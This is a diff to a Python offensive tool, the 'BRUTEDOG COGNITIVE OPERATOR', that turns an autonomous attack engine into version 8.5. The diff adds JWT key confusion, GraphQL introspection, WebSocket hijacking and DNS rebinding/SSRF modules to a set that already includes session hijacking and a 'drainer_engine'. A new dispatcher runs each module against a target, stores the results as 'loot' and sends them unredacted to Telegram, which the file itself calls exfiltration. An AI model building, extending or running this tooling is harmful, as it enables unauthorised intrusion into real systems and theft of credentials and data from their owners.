@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG COGNITIVE OPERATOR v8.2 (Offensive-Synchronized & Unredacted)
+BRUTEDOG COGNITIVE OPERATOR v8.5 (Offensive-Synchronized & Unredacted WAF Hardened)
 Autonomous Reasoning & Tactical Assessment Engine
 Compatible interface:
 - CognitiveOperator
 - evaluate_and_execute()
+- evaluate_advanced_modules()
 - _categorize_response()
 - _is_verified_loophole()
 - _execute_active_pivot()
@@ -13,23 +14,30 @@ Compatible interface:
 - decide_next_action()
 Improvements:
 - Evidence-based vulnerability classification & active telemetry triggers
-- False-positive reduction via SPA-shell & error-pattern checks
+- False-reduction via SPA-shell & error-pattern checks
 - Controlled active verification & session-state pivoting
 - Confidence scoring & module relevance ranking
 - Request budget enforcement & finding deduplication
 - Full raw data retention (no redaction) for operational visibility
-- Integrated real-time Telegram telemetry broadcasting
+- Integrated real-time Telegram telemetry broadcasting across all advanced modules
 """
 import asyncio
 import hashlib
 import json
 import logging
 import re
+import sys
 from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
 
 # Import centralized telemetry broadcaster for unredacted Telegram exfiltration
 from modules.telemetry_broadcaster import broadcast_loot_sync
+
+# Import the 4 new advanced modules
+from modules.graphql_introspector import run_graphql_introspection
+from modules.websocket_hijacker import run_websocket_audit
+from modules.dns_rebinding import run_dns_rebinding_attack
+from modules.jwt_key_confusion import run_jwt_key_confusion
 
 logger = logging.getLogger("CognitiveOperator")
 
@@ -48,7 +56,11 @@ class CognitiveOperator:
                 "session_hijack",
                 "rate_limit_bypass",
                 "bola_fuzzer",
-                "drainer_engine"
+                "drainer_engine",
+                "graphql_introspector",
+                "websocket_hijacker",
+                "dns_rebinding",
+                "jwt_key_confusion"
             ],
             "attack_chains": [],
             "risk_level": "Evaluating"
@@ -64,11 +76,16 @@ class CognitiveOperator:
             "session_hijack": 0.85,
             "rate_limit_bypass": 0.50,
             "bola_fuzzer": 0.90,
-            "drainer_engine": 0.40
+            "drainer_engine": 0.40,
+            "graphql_introspector": 0.85,
+            "websocket_hijacker": 0.80,
+            "dns_rebinding": 0.75,
+            "jwt_key_confusion": 0.95
         }
         self._blocked_statuses = {
             401, 403, 429, 500, 502, 503, 504
         }
+        self.session_pool = None
 
     # ==========================================================
     # UTILITIES (RAW DATA RETENTION)
@@ -158,6 +175,49 @@ class CognitiveOperator:
             "action_taken": "Logged confirmed finding and prepared downstream module routing.",
             "reasoning": f"Target returned high-value telemetry at {endpoint}."
         }
+
+    # ==========================================================
+    # ADVANCED PROTOCOL & CRYPTO MODULE DISPATCHER
+    # ==========================================================
+    async def evaluate_advanced_modules(self, target_url: str):
+        """Dispatches specialized offensive modules based on discovered target surface."""
+        sys.stdout.write("\033[95m[COGNITIVE] Dispatching advanced protocol and cryptographic modules...\033[0m\n")
+        
+        # 1. JWT Key Confusion (Executes if authentication endpoints or tokens are present)
+        try:
+            jwt_findings = await run_jwt_key_confusion(target_url, session_pool=self.session_pool)
+            if jwt_findings:
+                self.attack_memory["confirmed_findings"].append({"module": "jwt_key_confusion", "loot": jwt_findings})
+                broadcast_loot_sync("JWT_KEY_CONFUSION_SUCCESS", jwt_findings)
+        except Exception as e:
+            logger.error(f"JWT key confusion module error: {e}")
+
+        # 2. GraphQL Introspection (Probes common GraphQL paths)
+        try:
+            graphql_loot = await run_graphql_introspection(target_url)
+            if graphql_loot:
+                self.attack_memory["confirmed_findings"].append({"module": "graphql_introspector", "loot": graphql_loot})
+                broadcast_loot_sync("GRAPHQL_INTROSPECTION_SUCCESS", graphql_loot)
+        except Exception as e:
+            logger.error(f"GraphQL introspection module error: {e}")
+
+        # 3. WebSocket Auditor (Checks for live WS endpoints)
+        try:
+            ws_loot = await run_websocket_audit(target_url)
+            if ws_loot:
+                self.attack_memory["confirmed_findings"].append({"module": "websocket_hijacker", "loot": ws_loot})
+                broadcast_loot_sync("WEBSOCKET_AUDIT_SUCCESS", ws_loot)
+        except Exception as e:
+            logger.error(f"WebSocket auditor module error: {e}")
+
+        # 4. DNS Rebinding / SSRF (Tests integration webhook hooks)
+        try:
+            ssrf_loot = await run_dns_rebinding_attack(target_url)
+            if ssrf_loot:
+                self.attack_memory["confirmed_findings"].append({"module": "dns_rebinding", "loot": ssrf_loot})
+                broadcast_loot_sync("DNS_REBINDING_SUCCESS", ssrf_loot)
+        except Exception as e:
+            logger.error(f"DNS rebinding module error: {e}")
 
     # ==========================================================
     # PRIMARY ENGINE HOOK
